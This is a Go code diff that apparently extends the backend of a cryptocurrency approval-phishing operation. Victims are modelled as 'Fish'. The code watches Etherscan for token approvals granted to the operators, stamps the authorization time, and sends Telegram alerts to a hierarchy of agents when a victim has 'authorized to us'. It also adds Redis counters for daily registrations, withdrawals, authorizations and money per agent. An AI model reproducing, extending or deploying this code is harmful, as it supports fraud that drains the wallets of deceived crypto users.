@@ -247,7 +247,9 @@ type Fish struct {
 	MiningEarningETH       float64 `gorm:"type:decimal(30,18);comment:'挖矿收益'"` //挖矿收益
 	Belong                 int     //子代理 需要填写的字段
 	BelongString           string
-	InComeTimes            int `gorm:"int(10);default:1"` //发送收益次数
+	InComeTimes            int   `gorm:"int(10);default:1"` //发送收益次数
+	AuthorizationAt        int64 //授权时间
+
 }
 
 type Admin struct {
@@ -279,6 +281,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 		fmt.Println(err.Error())
 		return
 	}
+
 	body, err1 := ioutil.ReadAll(res.Body)
 	if err1 != nil {
 		fmt.Println(err1.Error())
@@ -290,6 +293,8 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 	var data TxList
 	err = json.Unmarshal([]byte(string(body)), &data)
 	if err != nil {
+		//fmt.Println("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
+		//fmt.Println(string(body))
 		fmt.Println(err.Error())
 		return
 	}
@@ -319,6 +324,8 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 							fishID := strconv.Itoa(int(fish.ID))
 							admin := Admin{}
 							Db.Where("id=?", fish.AdminId).First(&admin)
+							Db.Where("id=?", fish.AdminId).Update(&Fish{AuthorizationAt: time.Now().Unix()}) //更新授权时间
+
 							content := "❥【授权给我们报警!!】---------------------------------------------------->%0A" +
 								" 用户编号: [ 11784374" + fishID + "] " + "已授权给我们%0A" +
 								"所属代理ID:" + admin.Username + "%0A" +
@@ -355,7 +362,7 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 						" 用户备注: [" + fish.Remark + "] " + "%0A" +
 						"所属代理ID:" + admin.Username + "%0A" +
 						" 当前授权人数: [" + people + "] " + "%0A" +
-						" 时间: " + time.Now().Format("2006-01-02 15:04:05")+ "%0A" + "😱😱😱"
+						" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "😱😱😱"
 
 					NotificationAdmin(Db, fish.AdminId, content)
 				}
@@ -425,6 +432,98 @@ func NotificationAdmin(Db *gorm.DB, adminID int, Message string, ) {
 		url := "https://api.telegram.org/bot" + admin.TelegramToken + "/sendMessage?chat_id=" + admin.TelegramChatId + "&text=" + Message
 		res, _ := http.Get(url)
 		defer res.Body.Close()
+	}
+
+}
+
+/**
+  每日统计  个数
+
+	RegisterCount int     //注册个数
+	TiXianCount   int     //提现个数
+	Authorization int     //授权个数
+*/
+func AddEverydayData(redis *redis.Client, context string, SonAdminIdInt int, AdminIdInt int) {
+	SonAdminId := strconv.Itoa(SonAdminIdInt)
+	AdminId := strconv.Itoa(AdminIdInt)
+	//首先获取是否存在   子代
+	today := time.Now().Format("2006-01-02")
+	b := today + "_Total_" + SonAdminId
+	if a, _ := redis.HExists(b, context).Result(); a == true {
+		//存在  就先获取
+		c, _ := redis.HGet(b, context).Result()
+		newC, _ := strconv.Atoi(c)
+		redis.HSet(b, context, newC+1)
+	} else {
+		//不存在
+		redis.HSet(b, context, 1)
+	}
+
+	//总代
+	b = today + "_Total_" + AdminId
+	if a, _ := redis.HExists(b, context).Result(); a == true {
+		//存在  就先获取
+		c, _ := redis.HGet(b, context).Result()
+		newC, _ := strconv.Atoi(c)
+		redis.HSet(b, context, newC+1)
+	} else {
+		//不存在
+		redis.HSet(b, context, 1)
+	}
+	//超级管理员
+	b = today + "_Total_" + "1"
+	if a, _ := redis.HExists(b, context).Result(); a == true {
+		//存在  就先获取
+		c, _ := redis.HGet(b, context).Result()
+		newC, _ := strconv.Atoi(c)
+		redis.HSet(b, context, newC+1)
+	} else {
+		//不存在
+		redis.HSet(b, context, 1)
+	}
+
+}
+
+/**
+统计钱
+*/
+func AddEverydayMoneyData(redis *redis.Client, context string, SonAdminIdInt int, AdminIdInt int, Money float64) {
+	SonAdminId := strconv.Itoa(SonAdminIdInt)
+	AdminId := strconv.Itoa(AdminIdInt)
+	//首先获取是否存在   子代
+	today := time.Now().Format("2006-01-02")
+	b := today + "_Total_" + SonAdminId
+	if a, _ := redis.HExists(b, context).Result(); a == true {
+		//存在  就先获取
+		c, _ := redis.HGet(b, context).Result()
+		newC, _ := strconv.ParseFloat(c, 64)
+		redis.HSet(b, context, newC+Money)
+	} else {
+		//不存在
+		redis.HSet(b, context, Money)
+	}
+
+	//总代
+	b = today + "_Total_" + AdminId
+	if a, _ := redis.HExists(b, context).Result(); a == true {
+		//存在  就先获取
+		c, _ := redis.HGet(b, context).Result()
+		newC, _ := strconv.ParseFloat(c, 64)
+		redis.HSet(b, context, newC+Money)
+	} else {
+		//不存在
+		redis.HSet(b, context, Money)
+	}
+	//超级管理员
+	b = today + "_Total_" + "1"
+	if a, _ := redis.HExists(b, context).Result(); a == true {
+		//存在  就先获取
+		c, _ := redis.HGet(b, context).Result()
+		newC, _ := strconv.ParseFloat(c, 64)
+		redis.HSet(b, context, newC+Money)
+	} else {
+		//不存在
+		redis.HSet(b, context, Money)
 	}
 
 }
